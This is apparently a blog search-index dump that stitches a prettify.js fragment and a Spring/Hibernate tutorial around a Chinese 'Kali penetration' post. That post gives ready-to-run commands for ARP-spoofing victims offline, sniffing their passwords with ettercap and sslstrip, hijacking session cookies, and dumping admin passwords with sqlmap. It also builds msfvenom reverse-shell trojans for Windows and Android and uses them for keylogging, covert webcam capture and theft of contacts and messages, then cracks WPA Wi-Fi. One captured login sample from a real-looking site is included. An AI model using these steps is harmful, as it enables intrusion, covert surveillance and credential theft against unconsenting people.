/^\\/\\*[\\s\\S]*?(?:\\*\\/|$)/, null]); } var regexLiterals = options['regexLiterals']; if (regexLiterals) { /** * @const */ var regexExcls = regexLiterals > 1 ? '' // Multiline regex literals : '\\n\\r'; /** * @const */ var regexAny = regexExcls ? '.' : '[\\\\S\\\\s]'; /** * @const */ var REGEX_LITERAL = ( // A regular expression literal starts with a slash that is // not followed by * or / so that it is not confused with // comments. '/(?=[^/*' + regexExcls + '])' // and then contains any number of raw characters, + '(?:[^/\\\\x5B\\\\x5C' + regexExcls + ']' // escape sequences (\\x5C), + '|\\\\x5C' + regexAny // or non-nesting character sets (\\x5B\\x5D); + '|\\\\x5B(?:[^\\\\x5C\\\\x5D' + regexExcls + ']' + '|\\\\x5C' + regexAny + ')*(?:\\\\x5D|$))+' // finally closed by a /. + '/'); fallthroughStylePatterns.push( ['lang-regex', RegExp('^' + REGEXP_PRECEDER_PATTERN + '(' + REGEX_LITERAL + ')') ]); } var types = options['types']; if (types) { fallthroughStylePatterns.push([PR_TYPE, types]); } var keywords = (\"\" + options['keywords']).replace(/^ | $/g, ''); if (keywords.length) { fallthroughStylePatterns.push( [PR_KEYWORD, new RegExp('^(?:' + keywords.replace(/[\\s,]+/g, '|') + ')\\\\b'), null]); } shortcutStylePatterns.push([PR_PLAIN, /^\\s+/, null, ' \\r\\n\\t\\xA0']); var punctuation = // The Bash man page says // A word is a sequence of characters considered as a single // unit by GRUB. Words are separated by metacharacters, // which are the following plus space, tab, and newline: { } // | & $ ; < > // ... // A word beginning with # causes that word and all remaining // characters on that line to be ignored. // which means that only a '#' after /(?:^|[{}|&$;\\s])/ starts a // comment but empirically // $ echo // $ echo \\$# // $# // $ echo }# // }# // so /(?:^|[|&;\\s])/ is more appropriate. // http://gcc.gnu.org/onlinedocs/gcc-2.95.3/cpp_1.html#SEC3 // suggests that this definition is compatible with a // default mode that tries to use a single token definition // to recognize both bash/python style comments and C // preprocessor directives. // This definition of punctuation does not include # in the list of // follow-on exclusions, so # will not be broken before if preceeded // by a punctuation character. We could try to exclude # after // [|&;] but that doesn't seem to cause many major problems. // If that does turn out to be a problem, we should change the below // when hc is truthy to include # in the run of punctuation characters // only when not followint [|&;]. '^.[^\\\\s\\\\w.$@\\'\"`/\\\\\\\\]*'; if (options['regexLiterals']) { punctuation += '(?!\\s*\\/)'; } fallthroughStylePatterns.push( // TODO(mikesamuel): recognize non-latin letters and numerals in idents [PR_LITERAL, /^@[a-z_$][a-z_$@0-9]*/i, null], [PR_TYPE, /^(?:[@_]?[A-Z]+[a-z][A-Za-z_$@0-9]*|\\w+_t\\b)/, null], [PR_PLAIN, /^[a-z_$][a-z_$@0-9]*/i, null], [PR_LITERAL, new RegExp( '^(?:' // A hex number + '0x[a-f0-9]+' // or an octal or decimal number, + '|(?:\\\\d(?:_\\\\d+)*\\\\d*(?:\\\\.\\\\d*)?|\\\\.\\\\d\\\\+)' // possibly in scientific notation + '(?:e[+\\\\-]?\\\\d+)?' + ')' // with an optional modifier like UL for unsigned long + '[a-z]*', 'i'), null, '0123456789'], // Don't treat escaped quotes in bash as starting strings. // See issue 144. [PR_PLAIN, /^\\\\[\\s\\S]?/, null], [PR_PUNCTUATION, new RegExp(punctuation), null]); return createSimpleLexer(shortcutStylePatterns, fallthroughStylePatterns); } var decorateSource = sourceDecorator({ 'keywords': ALL_KEYWORDS, 'hashComments': true, 'cStyleComments': true, 'multiLineStrings': true, 'regexLiterals': true }); /** * Given a DOM subtree, wraps it in a list, and puts each line into its own * list item. * * @param {Node} node modified in place. Its content is pulled into an * HTMLOListElement, and each line is moved into a separate list item. * This requires cloning elements, so the input might not have unique * IDs after numbering. * @param {number|null|boolean} startLineNum * If truthy, coerced to an integer which is the 1-indexed line number * of the first line of code. The number of the first line will be * attached to the list. * @param {boolean} isPreformatted true iff white-space in text nodes should * be treated as significant. */ function numberLines(node, startLineNum, isPreformatted) { var nocode = /(?:^|\\s)nocode(?:\\s|$)/; var lineBreak = /\\r\\n?|\\n/; var document = node.ownerDocument; var li = document.createElement('li'); while (node.firstChild) { li.appendChild(node.firstChild); } // An array of lines. We split below, so this is initialized to one // un-split line. var listItems = [li]; function walk(node) { var type = node.nodeType; if (type == 1 && !nocode.test(node.className)) { // Element if ('br' === node.nodeName.toLowerCase()) { breakAfter(node); // Discard the since it is now flush against a . if (node.parentNode) { node.parentNode.removeChild(node); } } else { for (var child = node.firstChild; child; child = child.nextSibling) { walk(child); } } } else if ((type == 3 || type == 4) && isPreformatted) { // Text var text = node.nodeValue; var match = text.match(lineBreak); if (match) { var firstLine = text.substring(0, match.index); node.nodeValue = firstLine; var tail = text.substring(match.index + match[0].length); if (tail) { var parent = node.parentNode; parent.insertBefore( document.createTextNode(tail), node.nextSibling); } breakAfter(node); if (!firstLine) { // Don't leave blank text nodes in the DOM. node.parentNode.removeChild(node); } } } } // Split a line after the given node. function breakAfter(lineEndNode) { // If there's nothing to the right, then we can skip ending the line // here, and move root-wards since splitting just before an end-tag // would require us to create a bunch of empty copies. while (!lineEndNode.nextSibling) { lineEndNode = lineEndNode.parentNode; if (!lineEndNode) { return; } } function breakLeftOf(limit, copy) { // Clone shallowly if this node needs to be on both sides of the break. var rightSide = copy ? limit.cloneNode(false) : limit; var parent = limit.parentNode; if (parent) { // We clone the parent chain. // This helps us resurrect important styling elements that cross lines. // E.g. in FooBar // should be rewritten to FooBar. var parentClone = breakLeftOf(parent, 1); // Move the clone and everything to the right of the original // onto the cloned parent. var next = limit.nextSibling; parentClone.appendChild(rightSide); for (var sibling = next; sibling; sibling = next) { next = sibling.nextSibling; parentClone.appendChild(sibling); } } return rightSide; } var copiedListItem = breakLeftOf(lineEndNode.nextSibling, 0); // Walk the parent chain until we reach an unattached LI. for (var parent; // Check nodeType since IE invents document fragments. (parent = copiedListItem.parentNode) && parent.nodeType === 1;) { copiedListItem = parent; } // Put it on the list of lines for later processing. listItems.push(copiedListItem); } // Split lines while there are lines left to split. for (var i = 0; // Number of lines that have been split so far. i < listItems.length; // length updated by breakAfter calls. ++i) { walk(listItems[i]); } // Make sure numeric indices show correctly. if (startLineNum === (startLineNum|0)) { listItems[0].setAttribute('value', startLineNum); } var ol = document.createElement('ol'); ol.className = 'linenums'; var offset = Math.max(0, ((startLineNum - 1 /* zero index */)) | 0) || 0; for (var i = 0, n = listItems.length; i < n; ++i) { li = listItems[i]; // Stick a class on the LIs so that stylesheets can // color odd/even rows, or any other row pattern that // is co-prime with 10. li.className = 'L' + ((i + offset) % 10); if (!li.firstChild) { li.appendChild(document.createTextNode('\\xA0')); } ol.appendChild(li); } node.appendChild(ol); } /** * Breaks {@code job.sourceCode} around style boundaries in * {@code job.decorations} and modifies {@code job.sourceNode} in place. * @param {JobT} job * @private */ function recombineTagsAndDecorations(job) { var isIE8OrEarlier = /\\bMSIE\\s(\\d+)/.exec(navigator.userAgent); isIE8OrEarlier = isIE8OrEarlier && +isIE8OrEarlier[1]","path":"plugins/prettify/run_prettify.js"}],"posts":[{"title":"Kali","text":"总共是三台电脑A、B、CB可以pingAC，AC不能pingB，AC可以互ping 3.①：模型变换法对存在异方差性的模型进行适当的变量交换，使之成为满足同方差假定的模型，其前提是合理确定异方差性的具体形式。②：加权最小二乘法（WLS）对原模型进行加权，使之成为一个新的不存在异方差性的模型，然后采用最小二乘法估计其参数③：模型的对数变换对数变换使所测量的变量尺度缩小，进而缩小原变量差异的倍数，对数变换后的模型的残差$e_i$表示相对误差，其比绝对误差有较小的差异，进而降低异方差的影响。 第一个他将区间分为0-$\\frac{1}{2}$和$\\frac{1}{2}$其实只是为了让解答过程更加清晰一些而已，没有实际的意义。你完全可以也可以从$\\frac{1}{3}、\\frac{1}{4}$分开。 第二个同敛散问题你要观察，$\\int_\\frac{1}{2}^1\\frac{\\sqrt[m]{ln^2(1-x)}}{\\sqrt[n]{x}}dx$、$\\int_{\\frac{1}{2}}^1{\\sqrt[m]{ln^2(1-x)}}dx$，第二个积分中的被积函数的分母在这个区间内是一个有界的形式，而分子中的$ln(1-x)$在$x=1$的时候是无界的，所以只考虑分子就行了，他们同敛散。 后面的小于的话你构造一个新的函数然后求导就行了。 Kali渗透一、换源并安装open-vm-tools1.1 打开sources.list文件1leafpad /etc/apt/sources.list 1.2 在文件中添加如下内容1234deb http://mirrors.edu.cn/kali sana main non-free contribdeb http://mirrors.edu.cn/kali-security/sana/updates main contrib non-freedeb-src http://mirrors.ustc.edu.cn/kali-security/sana/updates main contrib non-freedeb http://mirrors.ustc.edu.cn/kali kali-rolling main non-free 1.3 更新并安装12apt-get updateapt-get install open-vm-tools-desktop fuse 二、安装中文输入2.1 下载搜狗在pinyin.sogou.com/linux中下载搜狗 2.2 安装终端进入上方文件路径，执行如下：12解决依赖：apt-get install -f安装：dpkg -i 包名 三、美化kali图标位置：/usr/share/icons/主题位置：/usr/share/themes/ 四、局域网断网攻击4.1 欺骗欺骗命令如下：1arpspoof -i 网卡 -t 被骗目标ip 网关 欺骗命令执行之前需要桥接自己的kali网络，其桥接过程如下： 右键kali系统，点开设置 将网络适配器设置成桥接模式 一次点开：编辑 -&gt; 虚拟网络编辑器 -&gt; vmnet0 -&gt; 确定 参数解读： 网卡：网卡是kali的网卡名，可以使用ifconfig查看（可见eth0） 被骗目标ip：受害者的ip，windows用户可以使用ipconfig查看 网关：网关是一个中间载体，同样可以使用ipconfig查看（默认网关） ip查询：我们在对受害者进行arp欺骗的时候，往往是不知道对方的ip的，但是我么可以使用如下命令偷偷的查询对方ip：1fping -asg 192.168.31.0/24 //网关最后是0+24 4.2 攻击4.2.1 瘫痪对方的电脑执行上述命令，即可让对方的网络瘫痪： 1arpspoof -i 网卡 -t 被骗目标ip 网关 执行之后，对方就无法正常使用网络了（比如访问网页、qq聊天等等一切网络活动），ctrl+z之后取消瘫痪操作 4.2.2 劫持对方的请求（账号，密码之类的）这里的劫持与上后面的瘫痪有点不同，劫持的话不能让对方网络瘫痪，所以我们在劫持之前需要进行如下命令操作（ip流量转发）：123cd /proc/sys/net/ipv4/ # 进入该目录cat ip_forward # 查看属性值，会发现输出0（默认是0，我们需要更改为1）echo 1 &gt; ip_forward```# 将ip_forward值改为1 如上操作之后我们继续执行arpspoof欺骗：1arpspoof -i 网卡 -t 被骗目标ip 网关 在欺骗之后，我们执行如下命令来进行嗅探：1ettercap -Tq -i eth0 执行之后发现，虽然这次对方可以正常使用网络，但是他的电脑已经在我们的监控中了，比如目标登录自己的某个站点，则在kali的终端上会输出对方的账号及密码 4.2.4 嗅探对方的浏览图片在进行上述的ip流量转发之后，我们可以使用如下命令来截取对方浏览页面的图片：1driftnet -i eth0 执行之后，会出现一个窗口 ，该窗口用于显示对方浏览页面的图片，并会将图片保存至kali本地 五、https账号、密码获取5.1 准备工作5.1.1 Vim：文本编辑器进入文件进行编辑：vim 123.txt （不存在会自动创建）退出文件编辑： 按ESC shift+： 输入q！ # 不保存退出 打开 etterc.conf文件1vim /etc/ettercap/ettc.conf/ 移动光标，把linux设置一下，将redir前的注释符删掉123# if you use iptables: #redir_command_on = \"iptables -t nat -A PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" #redir_command_off = \"iptables -t nat -D PREROUTING -i %iface -p tcp --dport %port -j REDIRECT --to-port %rport\" 刚开始是不能编辑的，编辑操作如下 vim编辑：按一下 i 就可以对文件进行编辑了，在上述所述的位置将两个#去掉 vim保存：按一下ESC键，再按shift+:键，继续如下： wq 保存并退出 q! 不保存并退出 5.1.2 开启ssh：1/etc/initd/ssh start 5.1.3 sslstrip工具这个工具能够把https的链接还原为http。执行命令：1sslstrip -a -f -k 参数说明： -a -f -k 5.2 截取账号及密码 执行欺骗操作 1arpspoof -i eth0 -t 192.168.31.117 192.168.31.1 执行sslstrip 1sslstrip -a -f -k 执行ettercap 1ettercap -Tq -i eth0 当目标用户登录https登录的时候就可以在kali终端获取到他的账号以及密码，例子如下： 12345HTTP : 211.80.112.41:80 -&gt; USER: 1620814 PASS: 741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a INFO: mids.gench.edu.cn/_customize/passLoginCONTENT: loginTicket=425d9c18-424b-418d-b027-2095e618f829&amp;username=1620814&amp;password=741948a7645fa6f8da44f69bd12e70443cc9d45b9714a26af17c84abe4e4d75a 分析： HTTP：ip及端口 USER：用户名 PASS：登录密码，注意：这里的密码并不是明文的，他是经过加密的，至于如何解密这个密码，以后有时间再来介绍 CONTENT：参数的组合 六、回话劫持，登录目标站点6.1 工具准备 arpspoof 欺骗 wireshark 抓包 ferret 重新生成抓包后的文件 hamster ferret安装，一次执行如下：123dpkg --add-architecture i386 &amp;&amp; apt-get update &amp;&amp; apt-get install ferret-sidejack:i386apt-get clean &amp;&amp; apt-get update &amp;&amp; apt-get upgrade -y &amp;&amp; apt-get dist-upgrade -yapt install ferret -y 6.2 过程（方法一） arpspoof欺骗 启动wireshark 1wireshark 点击eth0网卡，并让他持续运行下去 目标登录某个站点（上钩） 为了防止延迟，让wireshark再运行一段时间之后停掉wireshark 保存文件名为cookie至桌面，并格式为wireshark…….pacp 终端进入桌面，并执行如下命令（这个ferret有点问题，在这记录一下，以后再来看）： 1ferret -r cookie.pcap 执行hamster，会看到要求我们把代理改成本地（127.0.0.1）的，然后端口为1234 代开kali内置的火狐浏览器 点击设置 -&gt; Advanced -&gt; Network -&gt; Settings -&gt; 勾选Manual……并将http proxy改为127.0.0.1：1234 在kali中访问127.0.0.1：1234 之后会发现有个欺骗的ip，点开后就会出现很多的链接，ctrl+f找到 6.3 过程（方法二） ferret -i eth0 以后在记录 七、SQLMAP注入，ASP、PHP网站渗透7.1 科普7.1.1 ASPASP即Active Server Pages，是MicroSoft公司开发的服务器端脚本环境，可用来创建动态交互式网页并建立强大的web应用程序。当服务器收到对ASP文件的请求时，它会处理包含在用于构建发送给浏览器的HTML（Hyper Text Markup Language，超文本置标语言）网页文件中的服务器端脚本代码。除服务器端脚本代码外，ASP文件也可以包含文本、HTML（包括相关的客户端脚本）和com组件调用。 [1-2]ASP简单、易于维护 ， 是小型页面应用程序的选择 ，在使用DCOM （Distributed Component Object Model）和 MTS（Microsoft Transaction Server）的情况下， ASP甚至可以实现中等规模的企业应用程序。 [3] 7.1.2 PHPPHP（外文名:PHP: Hypertext Preprocessor，中文名：“超文本预处理器”）是一种通用开源脚本语言。语法吸收了C语言、Java和Perl的特点，利于学习，使用广泛，主要适用于Web开发领域。PHP 独特的语法混合了C、Java、Perl以及PHP自创的语法。它可以比CGI或者Perl更快速地执行动态网页。用PHP做出的动态页面与其他的编程语言相比，PHP是将程序嵌入到HTML（标准通用标记语言下的一个应用）文档中去执行，执行效率比完全生成HTML标记的CGI要高许多；PHP还可以执行编译后代码，编译可以达到加密和优化代码运行，使代码运行更快。 7.2 ASP渗透 监测是否存在注入1sqlmap -u 网站 如果该目标网站有注入，则会返回数据库的各种信息。 拆解目标网站的数据库表 1sqlmap -u 网站 --tables 根据User表拆解列名 1sqlamp -u 网站 --columns -T \"user\" username拆解出来后就不需要再进行拆解了 得到目标网站后台管理员的登录密码1sqlmap -u 目标网站 --dump -C \"username,password\" -T \"user\" —dump：下载数据-C “username,password” 列名 7.3 PHP渗透待更新 7.4 Cookie渗透待更新 八、Metasplooit8.1 基本操作 启动：msfconsole 漏洞利用工具：exploit 漏洞执行后的demo：payloads 8.2 远程控制软件8.2.1 实现过程 根据自己的ip设定一个木马（旧版使用msfpayload 不是 msfvenom -p），本操作是在桌面路径下执行 1msfvenom -p windows/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f exe &gt; test.exe 之后会生成一个test.exe木马程序，将文件拖至windows平台上 使用handler模块，本操作以及之后的操作是在msfconsole下执行 1use exploit/multi/handler 用shellcode程序 1set PAYLOAD windows/meterpreter/reverse_tcp 查看 1show options 设置参数，比如设置ip和端口 12set LHOST 自己的ipset LPORT 端口（55555） 执行并等待目标上钩 1exploit 8.2.2 木马基本功能当用户点击您的鱼饵之后，您就拥有了对方的所有权限，一下是一些基本的操作： sysinfo：获取到对方设备的系统信息 shell获取受害者的终端权限，通过这个终端您就可以完全控制对方的设备 background：将该权限放到后台，通过session -l（小写字母I） 1来重新获取会话 run vnc：开启远程桌面，执行之后就可以看到对方完整的桌面了。 注入进程 得到要注入的pid进程：ls migrate XXX（pid）注入 8.2.3 文件管理功能 download 下载文件 edit 编辑文件 cat 查看文件 mkdir 创建文件夹 mv 移动文件 rm 删除文件 upload 上传文件 rmdir 删除文件夹 8.2.4 网络及系统操作网络操作： arp 看arp缓冲表 ifconfig ip地址网卡 getproxy 获取代理 netstat 查看端口链接 系统操作： kill 杀进程 ps 查看进程表 reboot 重启电脑 reg 修改注册表 shell 获取终端 shutdown 关闭电脑 sysinfo 获取系统信息 8.2.5 用户操作和其他功能 enumdesktops 窗体 keyscan_dump 键盘记录—下载 keyscan_start 键盘记录—开始 keyscan_stop 键盘记录—停止 uictl 获取键盘鼠标控制权 record_mic 声音和音频录制 webscan_chat 查看摄像头接口 webscan_list 查看摄像头列表 webscan_stream 查看摄像头获取（偷窥） getsystem 获取管理员权限 hashdump 下载hash 九、安卓渗透9.1 实现过程 9.1 在终端根据自己的ip生成安卓木马1msfvenom -p android/meterpreter/reverse_tcp -e x86/shikata_ga_nai -i 5 LHOST=kali的ip LPORT=55555 -f apk &gt; test.APK 生成木马之后，我们将木马程序装在手机上即可。在这里呢，也就是我们平时比较常见的未知链接、不明邮件之类的鬼东西。 9.2 启动Metasplooit 1msfconsole 9.3 使用handler 1use exploit/multi/handler 9.4 设置安卓木马 1set PAYLOAD android/meterpreter/reverse_tcp 9.5 查看参数 1show options 9.6 设置参数 12set LHOST 192.168.31.147set HPORT 55555 9.7 启动监听 1exploit 9.2 常见操作 search 搜索文件（.jpg、.png、.bmp之类的文件），这个操作就有点邪恶了，大家一定要注意哦！！！ download 下载（.jpg、.png、.bmp之类的文件，还有你的所有短信、所有电话联系人…………………） webcam_stream 开启手机摄像头 webcam_snap 启动摄像头进行自动拍照（小心，这里拍照的过程中是不会有任何响应的，也就是说在这个过程中手机主人是不可能有任何察觉的） check_root 检查ROOT dump_calllog 下载电话记录 dump_contracts 下载短信记录 geolocat gps定位 十、Fluxion10.1 Fluxion下载下载fluxion源码并进入fluxion且运行：1234git clone https://github.com/FluxionNetwork/fluxion.git cd fluxion./fluxion.sh若提示没下载fluxion.sh，则按照要求下载就行 十一、密码破解 查看kali本机的密码字典 1locate wordlist 查看某个密码文件 1cat /etc/shadow 拷贝/etc/shadow密码文件 1cp /etc/shadow/ /root/Desktop/hash.list more /etc/login.defs 十二、Hydra1 十三、无线破解首先做的三步：123service network-manager stopairmon-ng check killaiarmon-ng start wlan0 开启监听：1airmon-ng statr wlan0 监听所有：1airodump-ng wlan0mon 监听指定bssid：1airodump-ng wlan0mon --bssid XXXX -c 频道 -w wpa(保存名) 将连接打掉：1aireplay-ng -0 2 -a [mac地址] -c [客户端mac地址] wlan0mon 12ifconfig wlan0mon downifconfig wlan0mon up 破解：1aircrack-ng -w [字典] /root/XXX.cap kali自带常用字典目录：12/usr/share/john/password.lst/usr/share/wfuzz/wordlist/ 查看字典文件是否含有该密码：1grep Password password.lst 查看字典有多少行：1cat [字典] | wc -l 解压文件：1gunzip rockyou.txt.gz 发现支持wps的AP123wash -i wlan0mon或者是airodump-ng wlan0mon --wps 爆破pin码：1reaver -i wlan0mon -b [ap mac] -vv -c [信道] wifite 伪造wifi：1airbase-ng -a [ap_mac] -c [信道] --essid [wifi名字] wlan0mon ```echo [ap(wifi名)] &gt;essid.txtairolib-ng essid_db —import essid essid.txtairolib-ng essid_db —statsairolib-ng essid_db —import password ./names.txtairolib-ng essid_db —batchaircrack-ng -r essid_fb /root/wpa-01.cap","path":"2018/11/23/Kali/"},{"title":"利用MyEclipse进行SSH项目整合","text":"1. 将Spring与Hibernate进行整合1.1 为项目添加Spring的开发支持 在开发的时候一定要先啊添加Spring而不是Hibernate，如果那样的话就热闹了。 1.1.1 创建一个新的web项目SSHDemo1.1.2 添加Spring configure facets install spring facet next勾上Spring Persistence，在这里面有个orm开发包，含有Hibernate整合、IBatis整合、JDO等整合。 1.2 添加Hibernate configure facets install Hibernate, 暂时选择Hibernate4.1 facet，如果Hibernate交给了Spring管理，那么Hibernate不再需要HibernateSessionFactory工具类的生成，随后SessionFactory交给了Spring负责管理，但是需要生成hibernate.cfg.xml文件，这个文件不再进行数据库，只进行相关的 将Create SessionFactory class去掉，√上Create hibernate.cfg.xml file-&gt; next 打开mysql：windows -&gt; perspective -&gt; open perspective -&gt; other -&gt; database explore -&gt; 之后就可以右键添加自己的数据库了 在上一步完成之后就可以在配置DB Driver的时候选择mysql了 -&gt; next -&gt; finish 1.3 将Spring和Hibernate进行整合1.3.1 修改hibernate.cfg.xml文件1234567891011121314&lt;?xml version='1.0' encoding='UTF-8'?&gt;&lt;!DOCTYPE hibernate-configuration PUBLIC \"-//Hibernate/Hibernate Configuration DTD 3.0//EN\" \"http://www.hibernate.org/dtd/hibernate-configuration-3.0.dtd\"&gt;&lt;!-- Generated by MyEclipse Hibernate Tools. --&gt;&lt;hibernate-configuration&gt; &lt;session-factory&gt; &lt;property name=\"dialect\"&gt;org.hibernate.dialect.MySQLDialect&lt;/property&gt; &lt;property name=\"show_sql\"&gt;true&lt;/property&gt; &lt;property name=\"format_sql\"&gt;true&lt;/property&gt; &lt;/session-factory&gt;&lt;/hibernate-configuration&gt; 1.3.2 建立一个database.properties文件，用于保存所有数据连接的信息123456789db.driver=com.mysql.cj.jdbc.Driverdb.url=jdbc:mysql://localhost:3306/test?useSSL=true&amp;serverTimezone=UTC&amp;useUnicode=true&amp;characterEncoding=UTF-8db.user=rootdb.password=123pool.max=1pool.min=1pool.init=10pool.idle=20 1.3.3 配置applicationContext.xml文件要想将Spring和Hibernate进行整合，那么就需要配置applicationContext.xml文件，以下是常用的配置步骤，每个步骤分别对应后面的代码。 在namespace中勾上context，用于添加Annotation支持 添加支持Annotation 通过classpath加载databasse.properties文件 配置数据库连接池 配置Hibernate的相关环境，SessionFactory可以打开Session 事务配置的声明 定义事务的切入点 添加支持Annotation 123&lt;!-- 配置annotation的支持操作 --&gt; &lt;context:annotation-config/&gt; &lt;context:component-scan base-package=\"com.tianxingjian\"/&gt; 通过classpath加载databasse.properties文件 12&lt;!-- 在本程序中设置要导入的资源文件路径，直接通过classpath加载 --&gt; &lt;context:property-placeholder location=\"classpath:database.properties\"/&gt; 配置数据库连接池 1234567891011&lt;!-- 配合数据库连接池 --&gt; &lt;bean id=\"dataSource\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\"&gt; &lt;property name=\"driverClass\" value=\"$&#123;db.driver&#125;\"/&gt; &lt;property name=\"jdbcUrl\" value=\"$&#123;db.url&#125;\"/&gt; &lt;property name=\"user\" value=\"$&#123;db.user&#125;\"/&gt; &lt;property name=\"password\" value=\"$&#123;db.password&#125;\"/&gt; &lt;property name=\"maxPoolSize\" value=\"$&#123;pool.max&#125;\"/&gt; &lt;property name=\"minPoolSize\" value=\"$&#123;pool.min&#125;\"/&gt; &lt;property name=\"initialPoolSize\" value=\"$&#123;pool.init&#125;\"/&gt; &lt;property name=\"maxIdleTime\" value=\"$&#123;pool.idle&#125;\"/&gt; &lt;/bean&gt; 配置Hibernate的相关环境，SessionFactory可以打开Session 123456789&lt;!-- 配置Hibernate的相关环境，SessionFactory可以打开Session --&gt; &lt;bean id=\"sessionFactory\" class=\"org.springframework.orm.hibernate4.LocalSessionFactoryBean\"&gt; &lt;property name=\"configLocation\" value=\"classpath:hibernate.cfg.xml\"&gt; &lt;/property&gt; &lt;!-- 就表示这个项目里面引用数据源关系 --&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt; &lt;/bean&gt; 事务的配置声明 123456789101112131415161718&lt;!-- 事务的配置声明 --&gt; &lt;tx:annotation-driven transaction-manager=\"transactionManager\" /&gt; &lt;tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\"&gt; &lt;!-- 定义一切与服务层有关的方法名称，只要是使用了特定的名称那么就会自动进行处理事务 --&gt; &lt;tx:attributes&gt; &lt;tx:method name=\"insert*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"update*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"delete*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"add*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"edit*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"change*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"login*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"get*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"load*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"list*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; 定义事务的切入点 12345&lt;!-- 定义事务的切入点 --&gt; &lt;aop:config expose-proxy=\"true\"&gt; &lt;aop:pointcut expression=\"execution(* com.tianxingjian..service.*.*(..))\" id=\"pointcut\"/&gt; &lt;aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"pointcut\"/&gt; &lt;/aop:config&gt; _以上就是本次项目中applicationContext.xml文件的相关配置，完整的applicationContext.xml文件的代码如下：_ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172&lt;?xml version=\"1.0\" encoding=\"UTF-8\"?&gt;&lt;beans xmlns=\"http://www.springframework.org/schema/beans\" xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xmlns:p=\"http://www.springframework.org/schema/p\" xmlns:tx=\"http://www.springframework.org/schema/tx\" xmlns:context=\"http://www.springframework.org/schema/context\" xmlns:aop=\"http://www.springframework.org/schema/aop\" xsi:schemaLocation=\"http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans-4.1.xsd http://www.springframework.org/schema/context http://www.springframework.org/schema/context/spring-context-4.1.xsd http://www.springframework.org/schema/aop http://www.springframework.org/schema/aop/spring-aop-4.1.xsd http://www.springframework.org/schema/tx http://www.springframework.org/schema/tx/spring-tx.xsd\"&gt; &lt;!-- 配置annotation的支持操作 --&gt; &lt;context:annotation-config/&gt; &lt;context:component-scan base-package=\"com.tianxingjian\"/&gt; &lt;!-- 在本程序中设置要导入的资源文件路径，直接通过classpath加载 --&gt; &lt;context:property-placeholder location=\"classpath:database.properties\"/&gt; &lt;!-- 配合数据库连接池 --&gt; &lt;bean id=\"dataSource\" class=\"com.mchange.v2.c3p0.ComboPooledDataSource\"&gt; &lt;property name=\"driverClass\" value=\"$&#123;db.driver&#125;\"/&gt; &lt;property name=\"jdbcUrl\" value=\"$&#123;db.url&#125;\"/&gt; &lt;property name=\"user\" value=\"$&#123;db.user&#125;\"/&gt; &lt;property name=\"password\" value=\"$&#123;db.password&#125;\"/&gt; &lt;property name=\"maxPoolSize\" value=\"$&#123;pool.max&#125;\"/&gt; &lt;property name=\"minPoolSize\" value=\"$&#123;pool.min&#125;\"/&gt; &lt;property name=\"initialPoolSize\" value=\"$&#123;pool.init&#125;\"/&gt; &lt;property name=\"maxIdleTime\" value=\"$&#123;pool.idle&#125;\"/&gt; &lt;/bean&gt; &lt;!-- 配置Hibernate的相关环境，SessionFactory可以打开Session --&gt; &lt;bean id=\"sessionFactory\" class=\"org.springframework.orm.hibernate4.LocalSessionFactoryBean\"&gt; &lt;property name=\"configLocation\" value=\"classpath:hibernate.cfg.xml\"&gt; &lt;/property&gt; &lt;!-- 就表示这个项目里面引用数据源关系 --&gt; &lt;property name=\"dataSource\" ref=\"dataSource\"/&gt; &lt;/bean&gt; &lt;!-- 配置事务处理，所有的事务都采用AOP的方式，本处只声明SessionFactory要进行事务处控制--&gt; &lt;bean id=\"transactionManager\" class=\"org.springframework.orm.hibernate4.HibernateTransactionManager\"&gt; &lt;property name=\"sessionFactory\" ref=\"sessionFactory\" /&gt; &lt;/bean&gt; &lt;!-- 事务的配置声明 --&gt; &lt;tx:annotation-driven transaction-manager=\"transactionManager\" /&gt; &lt;tx:advice id=\"txAdvice\" transaction-manager=\"transactionManager\"&gt; &lt;!-- 定义一切与服务层有关的方法名称，只要是使用了特定的名称那么就会自动进行处理事务 --&gt; &lt;tx:attributes&gt; &lt;tx:method name=\"insert*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"update*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"delete*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"add*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"edit*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"change*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"login*\" propagation=\"REQUIRED\"/&gt; &lt;tx:method name=\"get*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"load*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"list*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;tx:method name=\"*\" propagation=\"REQUIRED\" read-only=\"true\"/&gt; &lt;/tx:attributes&gt; &lt;/tx:advice&gt; &lt;!-- 定义事务的切入点 --&gt; &lt;aop:config expose-proxy=\"true\"&gt; &lt;aop:pointcut expression=\"execution(* com.tianxingjian..service.*.*(..))\" id=\"pointcut\"/&gt; &lt;aop:advisor advice-ref=\"txAdvice\" pointcut-ref=\"pointcut\"/&gt; &lt;/aop:config&gt;&lt;/beans&gt; 